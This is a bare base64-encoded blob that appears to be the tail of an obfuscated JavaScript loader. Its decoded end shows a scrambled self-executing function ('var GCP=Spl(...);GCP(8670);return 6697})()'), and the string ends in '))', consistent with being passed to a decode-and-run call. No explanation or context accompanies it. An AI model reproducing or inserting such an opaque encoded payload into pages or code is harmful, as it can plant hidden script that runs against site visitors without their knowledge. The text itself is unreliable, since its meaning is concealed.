biVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
